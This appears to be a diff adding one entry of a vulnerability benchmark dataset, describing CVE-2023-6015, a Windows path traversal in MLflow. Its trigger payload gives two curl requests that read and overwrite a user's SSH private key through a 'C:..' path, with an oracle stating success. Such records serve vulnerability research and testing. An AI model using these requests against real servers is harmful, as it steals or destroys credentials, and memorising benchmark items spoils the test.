@@ -1,0 +1,15 @@
+{
+  "file_id": "191_mlflow_huntr_43e6fb72-676e-4670-a225-15d6836f65d3",
+  "numeric_id": "191",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Path traversal vulnerability in MLflow on Windows due to improper handling of C:.. paths",
+  "cve": "CVE-2023-6015",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "mlflow",
+  "affected_version": "<= 2.6.0",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "curl -vv \"http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/C:../.ssh/id_rsa\"\ncurl -X PUT --data-binary test \"http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/C:../.ssh/id_rsa\"",
+  "oracle": "File contents of C://Users/User/.ssh/id_rsa are retrieved or the file is overwritten"
+}
